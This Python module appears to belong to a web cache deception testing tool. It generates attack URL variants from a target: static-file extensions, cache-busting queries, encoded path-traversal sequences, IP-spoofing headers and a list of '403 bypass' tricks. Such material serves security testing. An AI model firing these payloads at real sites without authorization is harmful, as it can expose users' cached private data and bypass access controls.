"""
WCD Payload Generation Module
"""

from typing import List, Dict
from urllib.parse import urlparse, urljoin
import random

class PayloadGenerator:
    def __init__(self):
        self.extensions = [
            '.css', '.js', '.jpg', '.jpeg', '.png', '.gif', '.svg',
            '.ico', '.woff', '.woff2', '.ttf', '.eot', '.pdf',
            '.html', '.htm', '.xml', '.json', '.txt'
        ]
        
        self.query_params = [
            '?fake.css', '?fake.js', '?cb=123', '?v=1',
            '?cache=false', '?nocache=1', '?_=123'
        ]
        
        self.path_manipulations = [
            '/', '%2e', '..;/', '%2e%2e%2f', '/%2e/',
            '/..%2f', '/./', '/.//', '///'
        ]
        
        self.headers_variations = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'}
        ]
    
    def generate_payloads(self, url: str) -> List[Dict]:
        """Generate WCD payloads for a given URL"""
        payloads = []
        parsed = urlparse(url)
        
        # Extension-based payloads
        for ext in self.extensions:
            payload_url = url + ext
            payloads.append({
                'url': payload_url,
                'type': f'extension_{ext[1:]}',
                'headers': {}
            })
        
        # Query parameter payloads
        for param in self.query_params:
            payload_url = url + param
            payloads.append({
                'url': payload_url,
                'type': f'query_param',
                'headers': {}
            })
        
        # Path manipulation payloads
        for manipulation in self.path_manipulations:
            if parsed.path.endswith('/'):
                payload_url = url + manipulation
            else:
                payload_url = url + '/' + manipulation
            
            payloads.append({
                'url': payload_url,
                'type': 'path_manipulation',
                'headers': {}
            })
        
        # Header variation payloads
        for headers in self.headers_variations:
            payloads.append({
                'url': url,
                'type': 'header_variation',
                'headers': headers
            })
        
        # Combined payloads (extension + query)
        for ext in self.extensions[:5]:  # Limit to avoid too many requests
            for param in self.query_params[:3]:
                payload_url = url + ext + param
                payloads.append({
                    'url': payload_url,
                    'type': 'combined_ext_query',
                    'headers': {}
                })
        
        # 403 Bypass techniques
        bypass_payloads = self._generate_403_bypass_payloads(url)
        payloads.extend(bypass_payloads)
        
        return payloads
    
    def _generate_403_bypass_payloads(self, url: str) -> List[Dict]:
        """Generate 403 bypass payloads"""
        payloads = []
        parsed = urlparse(url)
        
        bypass_techniques = [
            '%2e',
            '..;',
            '/./',
            '//',
            '/%2e/',
            '/..%2f',
            '/.%2e/',
            '/;/',
            '/%20/',
            '/%09/',
            '/%00/',
            '/.//',
            '///',
            '/.randomstring/../',
            '/..%252f',
            '/..%c0%af',
            '/..%c1%9c'
        ]
        
        for technique in bypass_techniques:
            # Apply to path
            if parsed.path:
                modified_path = parsed.path + technique
                payload_url = f"{parsed.scheme}://{parsed.netloc}{modified_path}"
                if parsed.query:
                    payload_url += f"?{parsed.query}"
                
                payloads.append({
                    'url': payload_url,
                    'type': '403_bypass',
                    'headers': {}
                })
        
        return payloads
